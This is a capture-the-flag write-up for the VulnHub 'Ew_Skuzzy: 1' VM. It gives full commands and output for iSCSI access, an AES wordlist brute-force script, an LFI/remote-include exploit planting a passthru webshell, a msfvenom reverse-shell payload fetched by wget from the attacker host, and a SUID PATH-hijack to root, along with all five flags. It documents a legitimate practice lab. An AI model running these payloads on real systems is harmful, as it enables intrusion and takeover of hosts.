@@ -1,0 +1,526 @@
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA512
+
+# $Id: 2017_ew-skuzzy-1.txt,v 1.1 2017/03/20 11:11:14 dhn Exp $
+
+Writeup Ew_Skuzzy: 1 [1]
+
+0x0) found the ports
+
+[dhn]::[~/dev/ctf/write_up/boot2root] export ip=192.168.178.82
+[dhn]::[~/dev/ctf/write_up/boot2root] nmap -A -T4 -p- $ip
+
+Starting Nmap 6.47 ( http://nmap.org  ) at 2017-03-19 09:50 CET
+Nmap scan report for skuzzy.fritz.box (192.168.178.82)
+Host is up (0.087s latency).
+Not shown: 65532 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     (protocol 2.0)
+|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
+80/tcp   open  http    nginx
+|_http-methods: No Allow or Public header in OPTIONS response (status code 405)
+|_http-title: Welcome!
+3260/tcp open  iscsi?
+|_iscsi-info: ERROR: Script execution failed (use -d to debug)
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at http://www.insecure.org/cgi-bin/servicefp-submit.cgi :
+SF-Port22-TCP:V=6.47%I=7%D=3/19%Time=58CE4672%P=x86_64-pc-linux-gnu%r(NULL
+SF:,29,"SSH-2\.0-OpenSSH_7\.2p2\x20Ubuntu-4ubuntu2\.1\r\n");
+
+Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 154.66 seconds
+
+0x1) discover port 3260:iscsi
+
+[dhn]::[~/dev/ctf/write_up/boot2root] iscsiadm -m discovery -t sendtargets -p $ip:3260
+192.168.178.82:3260,1 iqn.2017-02.local.skuzzy:storage.sys0
+[dhn]::[~/dev/ctf/write_up/boot2root] iscsiadm -m node -T iqn.2017-02.local.skuzzy:storage.sys0 -p $ip:3260 --login
+Logging in to [iface: default, target: iqn.2017-02.local.skuzzy:storage.sys0, portal: 192.168.178.82,3260] (multiple)
+Login to [iface: default, target: iqn.2017-02.local.skuzzy:storage.sys0, portal: 192.168.178.82,3260] successful.
+[dhn]::[~/dev/ctf/write_up/boot2root] iscsiadm --mode session
+tcp: [1] 192.168.178.82:3260,1 iqn.2017-02.local.skuzzy:storage.sys0 (non-flash)
+[dhn]::[~/dev/ctf/write_up/boot2root]
+
+0x2) mount the iscsi device
+
+[dhn]::[~/dev/ctf/write_up/boot2root] mount /dev/sdb /mnt
+[dhn]::[~/dev/ctf/write_up/boot2root] ls /mnt
+total 548K
+ 16K lost+found/  528K bobsdisk.dsk  4.0K flag1.txt
+[dhn]::[~/dev/ctf/write_up/boot2root]
+
+0x3) get the first flag
+
+[dhn]::[~/dev/ctf/write_up/boot2root] cat /mnt/flag1.txt
+Congratulations! You've discovered the first flag!
+
+flag1{c0abc15976b98a478150c900ebb0c86f0327f4dd}
+
+Let's see how you go with the next one...
+[dhn]::[~/dev/ctf/write_up/boot2root]
+
+0x3) discover "bobsdisk.dsk"
+
+[dhn]::[~/dev/ctf/write_up/boot2root] file /mnt/bobsdisk.dsk
+bobsdisk.dsk: Linux rev 1.0 ext2 filesystem data, UUID=faef0c66-b61b-4d80-8c20-5e8da65345d4 (large files)
+[dhn]::[~/dev/ctf/write_up/boot2root] losetup /dev/loop0 /mnt/bobsdisk.dsk
+[dhn]::[~/dev/ctf/write_up/boot2root] mount /dev/loop0 /media
+[dhn]::[~/dev/ctf/write_up/boot2root] ls /media
+total 16K
+ 12K lost+found/  3.0K ToAlice.eml  1.0K ToAlice.csv.enc
+[dhn]::[~/dev/ctf/write_up/boot2root]
+
+0x4) get the second flag
+
+[dhn]::[~/dev/ctf/write_up/boot2root] cat /media/ToAlice.eml
+G'day Alice,
+
+You know what really annoys me? How you and I ended up being used, like some kind of guinea pigs, by the RSA crypto wonks as actors in their designs for public key crypto... I don't recall ever being asked if that was ok? I never got even one cent of royalties from them!? RSA have made Millions on our backs, and it's time we took a stand!
+
+Starting now, today, immediately, I'm never using asymmetric key encryption again, and it's all symmetric keys from here on out. All my files and documents will be encrypted with that popular symmetric crypto algorithm. Uh. Yeah, I can't pronounce its original name. I don't even know what the letters in its other name stand for - but really - that's not important. A bloke at my local hackerspace says its the beez kneez, ridgy-didge, real-deal, the best there is when it comes to symmetric key crypto, he has heaps of stickers on his laptop so I guess it means he knows, right? Anyway, he said it won some big important competition among crypto geeks in October 2000? Lucky Y2K didn't happen then, I suppose or that would have been one boring party!
+
+Anyway this algorithm sounded good to me. I used the updated version that won the competition.
+
+You know what happened to me this morning? My kids, the little darlings, had spilled their fancy 256 bit Lego kit all over the damn floor. Sigh. Of course I trod on it making my coffee, the level of pain really does ROCKYOU to the core when it happens! It's hard to stay mad though, I really love Lego, the way those blocks chain togeather really does make them work brilliantly.
+
+Anyway, given I'm not not using asymmetric crypto any longer, I destroyed my private key, so the public key you have for me may as well be deleted. I've got some notes for you which might help in your current case, I've encrypted it using my new favourite symmetric key crypto algorithm, it should be on the disk with this note.
+
+Give me a shout when you're down this way again, we'll catch up for coffee (once the Lego is removed from my foot) :)
+
+Cheers,
+
+Bob.
+
+PS: Oh, before I forget, the hacker-kid who told me how to use this new algorithm, said it was very important I used the command option -md sha256 when decrypting. Why? Who knows? He said something about living on the bleeding-edge...
+
+PPS: flag2{054738a5066ff56e0a4fc9eda6418478d23d3a7f}
+
+
+[dhn]::[~/dev/ctf/write_up/boot2root]
+
+0x5) bruteforce the AES decryption password
+
+[dhn]::[~/dev/ctf/write_up/boot2root] cat aes_bf.sh
+#!/usr/bin/env bash
+# $Id: aes_bf.sh,v 1.0 2017/03/19 19:02:44 dhn Exp $
+
+WORDLIST=${1}
+
+while read pwd; do
+	openssl aes-256-cbc \
+		-d -md sha256 \
+		-in /media/ToAlice.csv.enc \
+		-out /tmp/ToAlice.csv \
+		-k ${pwd} 2>/dev/null
+
+	file=$(file /tmp/ToAlice.csv | awk '{print $2}')
+	if [[ ${?} -eq 0 && ${file} == "ASCII"  ]]; then
+		echo "[+] Key found: ${pwd}"
+		exit 0
+	fi
+done < ${WORDLIST}
+
+# ~2 hours/10 threads and 3475549 combinations later...
+
+[dhn]::[~/dev/ctf/write_up/boot2root] ./aes_bf.sh /usr/share/wordlists/rockyou.txt
+[+] Key found: supercalifragilisticoespialidoso
+
+    The name of this job.             : ./aes_bf.sh /usr/share/wordlists/rockyou.txt
+    CPU seconds spent in user mode.   : 1746.50s
+    CPU seconds spent in kernel mode. : 423.06s
+    Elapsed time in seconds.          : 7406.03s
+    The  CPU percentage.              : 29%
+[dhn]::[~/dev/ctf/write_up/boot2root]
+
+0x6) get the third flag
+
+[dhn]::[~/dev/ctf/write_up/boot2root] cat /tmp/ToAlice.csv
+Web Path,Reason
+5560a1468022758dba5e92ac8f2353c0,Black hoodie. Definitely a hacker site! 
+c2444910794e037ebd8aaf257178c90b,Nice clean well prepped site. Nothing of interest here.
+flag3{2cce194f49c6e423967b7f72316f48c5caf46e84},The strangest URL I've seen? What is it?
+
+0x7) look deeper
+
+[dhn]::[~/dev/ctf/write_up/boot2root] curl -s http://$ip/5560a1468022758dba5e92ac8f2353c0/ | grep -e '[^\ ]\{40,\}' | base64 -d
+George Costanza: [Soup Nazi gives him a look] Medium turkey chili.
+[instantly moves to the cashier]
+Jerry Seinfeld: Medium crab bisque.
+George Costanza: [looks in his bag and notices no bread in it] I didn't get any bread.
+Jerry Seinfeld: Just forget it. Let it go.
+George Costanza: Um, excuse me, I - I think you forgot my bread.
+Soup Nazi: Bread, $2 extra.
+George Costanza: $2? But everyone in front of me got free bread.
+Soup Nazi: You want bread?
+George Costanza: Yes, please.
+Soup Nazi: $3!
+George Costanza: What?
+Soup Nazi: NO FLAG FOR YOU
+
+0x8) use the LFI in combination with an php wrapper [2]
+
+[dhn]::[~/dev/ctf/write_up/boot2root] curl -s http://$ip/c2444910794e037ebd8aaf257178c90b/?p=php://filter/convert.base64-encode/resource=reader.php \
+    | grep -e '[^\ ]\{40,\}' | base64 -d 
+
+<?php
+defined ('VIAINDEX') or die('Ooooh! So close..');
+?>
+<h1>Feed Reader</h1>
+<?php
+if(isset($_GET['url'])) {
+    $url = $_GET['url'];
+} else {
+    print("<a href=\"?p=reader&url=http://127.0.0.1/c2444910794e037ebd8aaf257178c90b/data.txt\">Load Feed</a>");
+}
+
+if(isset($url) && strlen($url) != '') {
+
+    // Setup some variables.
+    $secretok = false;
+    $keyneeded = true;
+
+    // Localhost as a source doesn't need to use the key.
+    if(preg_match("#^http://127.0.0.1#", $url)) {
+        $keyneeded = false;
+        $secretok = true;
+    }
+
+    // Handle the key validation when it's needed.
+    if($keyneeded) {
+        $key = $_GET['key'];
+        if(is_array($key)) {
+            die("Array trick is mitigated ;)");
+        }
+        if(isset($key) && strlen($key) == '47') {
+            $hashedkey = hash('sha256', $key);
+            $secret = "5ccd0dbdeefbee078b88a6e52db8c1caa8dd8315f227fe1e6aee6bcb6db63656";
+
+            // If you can use the following code for a timing attack
+            // then good luck :) But.. You have the source anyway, right? :)
+            if(strcmp($hashedkey, $secret) == 0) {
+                $secretok = true;
+            } else {
+                die("Sorry... Authentication failed. Key was invalid.");
+            }
+
+        } else {
+            die("Authentication invalid. You might need a key.");
+        }
+    }
+
+    // Just to make sure the above key check was passed.
+    if(!$secretok) {
+        die("Something went wrong with the authentication process");
+    }
+
+    // Now load the contents of the file we are reading, and parse
+    // the super awesomeness of its contents!
+    $f = file_get_contents($url);
+
+    $text = preg_split("/##text##/s", $f);
+
+    if(isset($text['1']) && strlen($text['1']) > 0) {
+        print($text['1']);
+    }
+
+    print "<br /><br />";
+
+    $php = preg_split("/##php##/s", $f);
+
+    if(isset($php['1']) && strlen($php['1']) > 0) {
+        eval($php['1']);
+        // "If Eval is the answer, you're asking the wrong question!" - SG
+        // It hurts me to write insecure code like this, but it is in the
+        // name of education, and FUN, so I'll let it slide this time.
+    }
+}
+
+[dhn]::[~/dev/ctf/write_up/boot2root] curl -s http://$ip/c2444910794e037ebd8aaf257178c90b/?p=php://filter/convert.base64-encode/resource=data.txt \
+    | grep -e '[^\ ]\{40,\}' | base64 -d
+
+##text##
+This is some example source data for my nice little feed reader. I have designed my own nice little format which will allow it to include dynamic content. Who needs consultants when it's this easy? :)
+
+One of the best things is this will allow me to host my feed content to display on this page on an external server! So flexible :D
+##text##
+
+##php##
+print("See? This is totally dynamic, generated by PHP right in my own little tool. Hacker proof, too, because there is a secret key required!");
+##php##
+
+0x9) get the fourth flag
+
+[dhn]::[~/dev/ctf/write_up/boot2root] curl -s http://$ip/c2444910794e037ebd8aaf257178c90b/?p=php://filter/convert.base64-encode/resource=flag.php \
+    | grep -e '[^\ ]\{40,\}' | base64 -d
+
+<?php
+defined ('VIAINDEX') or die('Ooooh! So close..');
+?>
+<h1>Flag</h1>
+<p>Hmm. Looking for a flag? Come on... I haven't made it easy yet, did you think I was going to this time?</p>
+<img src="trollface.png" />
+<?php
+// Ok, ok. Here's your flag!
+//
+// flag4{4e44db0f1edc3c361dbf54eaf4df40352db91f8b}
+//
+// Well done, you're doing great so far!
+// Next step. SHELL!
+//
+//
+// Oh. That flag above? You're gonna need it...
+?>
+
+0xa) use the flag4 in combination with the lfi:
+
+    // Handle the key validation when it's needed.
+    if($keyneeded) {
+        $key = $_GET['key'];
+        if(is_array($key)) {
+            die("Array trick is mitigated ;)");
+        }
+        if(isset($key) && strlen($key) == '47') {
+            $hashedkey = hash('sha256', $key);
+            $secret = "5ccd0dbdeefbee078b88a6e52db8c1caa8dd8315f227fe1e6aee6bcb6db63656";
+
+            // If you can use the following code for a timing attack
+            // then good luck :) But.. You have the source anyway, right? :)
+            if(strcmp($hashedkey, $secret) == 0) {
+                $secretok = true;
+            } else {
+                die("Sorry... Authentication failed. Key was invalid.");
+            }
+
+        } else {
+            die("Authentication invalid. You might need a key.");
+        }
+    }
+
+[dhn]::[~/dev/ctf/write_up/boot2root] cat data.txt
+##php##
+passthru($_POST["cmd"]);
+##php##
+[dhn]::[~/dev/ctf/write_up/boot2root] php -S 174.0.42.42:80
+PHP 7.0.16-3 Development Server started at Mon Mar 20 05:03:26 2017
+Listening on http://174.0.42.42:80
+Document root is /
+Press Ctrl-C to quit.
+[Mon Mar 20 05:13:28 2017] 174.0.42.17:58322 [200]: /data.txt
+[Mon Mar 20 05:13:38 2017] 174.0.42.17:58324 [200]: /data.txt
+
+[dhn]::[~/dev/ctf/write_up/boot2root] curl -s --data "cmd=id" "http://$ip/c2444910794e037ebd8aaf257178c90b/?p=reader&url=http://174.0.42.42/
+    data.txt&key=flag4\{4e44db0f1edc3c361dbf54eaf4df40352db91f8b\}"
+
+...
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+...
+
+0xb) create meterpreter and start multi handler
+
+[dhn]::[~/dev/ctf/write_up/boot2root] msfvenom -p linux/x86/meterpreter/reverse_tcp -a x86 --platform linux -b '\\x00' LHOST="174.0.42.42" LPORT=7766 -f elf -o dhn
+Found 10 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 98 (iteration=0)
+x86/shikata_ga_nai chosen with final size 98
+Payload size: 98 bytes
+Final size of elf file: 182 bytes
+Saved as: dhn
+
+0xc) use the webshell to download and execute the meterpreter
+
+[dhn]::[~/dev/ctf/write_up/boot2root] curl -s --data "cmd=wget http://174.0.42.42/dhn -O /tmp/evil" "http://$ip/c2444910794e037ebd8aaf257178c90b/?p=reader&url=http://174.0.42.42/
+    data.txt&key=flag4\{4e44db0f1edc3c361dbf54eaf4df40352db91f8b\}"
+[dhn]::[~/dev/ctf/write_up/boot2root] curl -s --data "cmd=chmod 777 /tmp/evil" "http://$ip/c2444910794e037ebd8aaf257178c90b/?p=reader&url=http://174.0.42.42/
+    data.txt&key=flag4\{4e44db0f1edc3c361dbf54eaf4df40352db91f8b\}"
+[dhn]::[~/dev/ctf/write_up/boot2root] curl -s --data "cmd=bash -c /tmp/evil" "http://$ip/c2444910794e037ebd8aaf257178c90b/?p=reader&url=http://174.0.42.42/
+    data.txt&key=flag4\{4e44db0f1edc3c361dbf54eaf4df40352db91f8b\}"
+
+0xd) gathering information
+
+[*] Started reverse TCP handler on 174.0.42.42:7766
+[*] Starting the payload handler...
+[*] Transmitting intermediate stager for over-sized stage...(105 bytes)
+[*] Sending stage (1495599 bytes) to 174.0.42.17
+[*] Meterpreter session 1 opened (174.0.42.42:7766 -> 174.0.42.17:40986) at 2017-03-20 05:25:11 -0400
+
+meterpreter > sysinfo
+Computer     : skuzzy
+OS           : Linux skuzzy 4.4.0-64-generic #85-Ubuntu SMP Mon Feb 20 11:50:30 UTC 2017 (x86_64)
+Architecture : x64
+Meterpreter  : x86/linux
+meterpreter >
+
+0xe) find binarys with SUID bit
+
+meterpreter > shell
+Process 1505 created.
+Channel 1 created.
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+$ find / -perm -4000 2>/dev/null
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/snapd/snap-confine
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/bin/chsh
+/usr/bin/newuidmap
+/usr/bin/pkexec
+/usr/bin/chfn
+/usr/bin/at
+/usr/bin/newgidmap
+/usr/bin/passwd
+/usr/bin/sudo
+/bin/fusermount
+/bin/mount
+/bin/su
+/bin/ntfs-3g
+/bin/ping
+/bin/ping6
+/bin/umount
+/opt/alicebackup
+$ file /opt/alicebackup
+/opt/alicebackup: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=587cb3f605572eb675e8c71496610e7cce2a3a97, not stripped
+$ /opt/alicebackup
+uid=0(root) gid=0(root) groups=0(root),33(www-data)
+ssh: Could not resolve hostname alice.home: Temporary failure in name resolution
+lost connection
+$
+
+0xf) download "/opt/alicebackup" and reverse it ;)
+
+[dhn]::[~/dev/ctf/write_up/boot2root] gdb -q alicebackup
+Reading symbols from alicebackup...(no debugging symbols found)...done.
+gdb-peda$ info functions
+All defined functions:
+
+Non-debugging symbols:
+0x00000000000005a8  _init
+0x00000000000005d0  system@plt
+0x00000000000005e0  setgid@plt
+0x00000000000005f0  setuid@plt
+0x0000000000000610  _start
+0x0000000000000640  deregister_tm_clones
+0x0000000000000680  register_tm_clones
+0x00000000000006d0  __do_global_dtors_aux
+0x0000000000000710  frame_dummy
+0x0000000000000740  main
+0x0000000000000790  __libc_csu_init
+0x0000000000000800  __libc_csu_fini
+0x0000000000000804  _fini
+gdb-peda$ b *main
+Breakpoint 1 at 0x740
+gdb-peda$ r
+...
+ [----------------------------------registers-----------------------------------]
+RAX: 0xffffffff
+RBX: 0x0
+RCX: 0x7ffff7af3f03 (<__setgid+19>:     cmp    rax,0xfffffffffffff000)
+RDX: 0xffffffffffffff98
+RSI: 0x7fffffffdfd8 --> 0x7fffffffe214 ("/home/dhn/dev/ctf/write_up/boot2root/alicebackup")
+RDI: 0x555555554818 --> 0x6469 ('id')
+RBP: 0x7fffffffdef0 --> 0x555555554790 (<__libc_csu_init>:      push   r15)
+RSP: 0x7fffffffdef0 --> 0x555555554790 (<__libc_csu_init>:      push   r15)
+RIP: 0x555555554769 (<main+41>: mov    eax,0x0)
+R8 : 0x555555554800 (<__libc_csu_fini>: repz ret)
+R9 : 0x7ffff7de8a50 (<_dl_fini>:        push   rbp)
+R10: 0x828
+R11: 0x246
+R12: 0x555555554610 (<_start>:  xor    ebp,ebp)
+R13: 0x7fffffffdfd0 --> 0x1
+R14: 0x0
+R15: 0x0
+EFLAGS: 0x213 (CARRY parity ADJUST zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x555555554758 <main+24>:    mov    eax,0x0
+   0x55555555475d <main+29>:    call   0x5555555545e0 <setgid@plt>
+   0x555555554762 <main+34>:    lea    rdi,[rip+0xaf]        # 0x555555554818
+=> 0x555555554769 <main+41>:    mov    eax,0x0
+   0x55555555476e <main+46>:    call   0x5555555545d0 <system@plt>
+   0x555555554773 <main+51>:    lea    rdi,[rip+0xa6]        # 0x555555554820
+   0x55555555477a <main+58>:    mov    eax,0x0
+   0x55555555477f <main+63>:    call   0x5555555545d0 <system@plt>
+[------------------------------------stack-------------------------------------]
+0000| 0x7fffffffdef0 --> 0x555555554790 (<__libc_csu_init>:     push   r15)
+0008| 0x7fffffffdef8 --> 0x7ffff7a5b2b1 (<__libc_start_main+241>:       mov    edi,eax)
+0016| 0x7fffffffdf00 --> 0x40000
+0024| 0x7fffffffdf08 --> 0x7fffffffdfd8 --> 0x7fffffffe214 ("/home/dhn/dev/ctf/write_up/boot2root/alicebackup")
+0032| 0x7fffffffdf10 --> 0x1f7b9c168
+0040| 0x7fffffffdf18 --> 0x555555554740 (<main>:        push   rbp)
+0048| 0x7fffffffdf20 --> 0x0
+0056| 0x7fffffffdf28 --> 0x790bdd7d34785919
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0x0000555555554769 in main ()
+gdb-peda$ x /s $rdi
+0x555555554818: "id"
+gdb-peda$
+...
+
+rdi: id -> system(id) -> uid=0(root) gid=0(root) groups=0(root),33(www-data)
+
+0x10) get root shell
+
+$ python -c 'import pty;pty.spawn("/bin/bash")'
+www-data@skuzzy:/var/www/html/c2444910794e037ebd8aaf257178c90b$ cd /tmp/
+www-data@skuzzy:/tmp$ echo "bash -i" >> id
+www-data@skuzzy:/tmp$ cat id
+bash -i
+www-data@skuzzy:/tmp$ chmod +x id
+www-data@skuzzy:/tmp$ export PATH=/tmp/:$PATH
+www-data@skuzzy:/tmp$ /opt/alicebackup
+/opt/alicebackup
+root@skuzzy:/tmp# find / -name "flag.txt"
+/root/flag.txt
+root@skuzzy:/tmp#
+
+0x11) get the fifth flag
+
+root@skuzzy:/tmp# cat /root/flag.txt
+Congratulations!
+
+flag5{42273509a79da5bf49f9d40a10c512dd96d89f6a}
+
+You've found the final flag and pwned this CTF VM!
+
+I really hope this was an enjoyable challenge, and that my trolling and messing with you didn't upset you too much! I had a blast making this VM, so it won't be my last!
+
+I'd love to hear your thoughts on this one.
+Too easy?
+Too hard?
+Too much stuff to install to get the iSCSI initiator working?
+
+Drop me a line on twitter @vortexau, or via email vortex@juicedigital.net
+root@skuzzy:/tmp#
+
+0x12) flags:
+
+    flag1{c0abc15976b98a478150c900ebb0c86f0327f4dd}
+    flag2{054738a5066ff56e0a4fc9eda6418478d23d3a7f}
+    flag3{2cce194f49c6e423967b7f72316f48c5caf46e84}
+    flag4{4e44db0f1edc3c361dbf54eaf4df40352db91f8b}
+    flag5{42273509a79da5bf49f9d40a10c512dd96d89f6a}
+
+[1] https://www.vulnhub.com/entry/ew_skuzzy-1,184/
+[2] http://www.php.net/manual/en/wrappers.php.php
+
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1
+
+iQIcBAEBCgAGBQJYz6rKAAoJEKjdmUcmQRI85r4P/iVsBs3UXT6xNvKrNVy7+YgI
+mloquWlIGAun0x62r4jlLLePf2PXqtip3tAWlmvjFTPdaG82oBN8a6JfPHeRqv6d
+fFDv8WlKqyVKKWoVnj0hBTAruqzLjC9jVSn8IewjVqVfwDmG1fRA+0mvNPW68Afk
+4VCrShKXkwUB/CarvaI3HGy2idW1alajKkGCqye9DxM+43DUen+6ZN0tlxceDG7U
+1XwHIUoUt3tjZjcdCA16kdPhmlxkneXSjNWU0H+u7h+XAaO06hmRDVSGMo0sMBXr
+4NWPOmHCMtMhsBXN+EImct+0B88+ZNkmkhGyFqgRay2nkMOJEow3Z0WnXn0KkDJI
+INgRL7p8rPLFJ3ddEOaLfsyqKU+aN1N5VHHKGoN6Q1CY3qyzKqgfi2OGHCWngDAH
+gqTKYPxrKdmWYvSzv11FY59QjIFJwGM/mwsQ77kI4OXBfSau5P6sxETgma3f5P/I
+3M9D1k2q5NpE0OvmS0JprcVpCPKXc0xNN/MDjtojf3I1++p8EqWqxXmAx5OTbhex
+81Zl9jnopuJy2S3VcOGRr6QMU7KJfYu15RA0AZFoNRLdr4zPrdvVpl8xemhl74pc
+Nz1ILaYi0ytqpDNkcGDmK8XB/6D0F2S3zWUKqXL85HJJN5Jio7gaSuclSd4MDzhG
+NFWYbf6y+q4ADmNXfac6
+=F9pW
+-----END PGP SIGNATURE-----
